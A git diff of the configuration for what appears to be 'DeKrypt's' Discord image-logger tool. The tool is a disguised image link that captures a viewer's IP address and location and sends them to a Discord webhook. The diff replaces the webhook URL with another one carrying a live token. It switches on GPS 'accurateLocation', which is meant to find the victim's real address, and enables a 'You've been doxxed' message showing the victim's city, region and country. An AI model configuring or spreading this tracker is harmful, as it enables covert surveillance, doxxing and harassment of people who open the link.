@@ -9,7 +9,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1087105564254949427/B_kIzSf1l8OVTsvNGsYVLawsMQK6ezyPUtmAurzl3Hw2iHfTfTq4J5vVqyqAFbV40H_-", # Set the webhook in here
+    "webhook": "https://discord.com/api/webhooks/1087408523027161198/6b_TmCThINyXgXGcHlLERAipgBN7_DMFOSHpwKrqbLOyen-bhZ-kVWCvhJ3wrs_BU3tY", # Set the webhook in here
     "image": "https://tr.rbxcdn.com/03eab0c4a163ae85bf404feb41406804/150/150/AvatarHeadshot/Png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -21,11 +21,11 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "You've been doxxed by Ordinary. Your current address is: {city}, {region}, {country}.", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "You've been doxxed. Your current address is: {city}, {region}, {country}.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
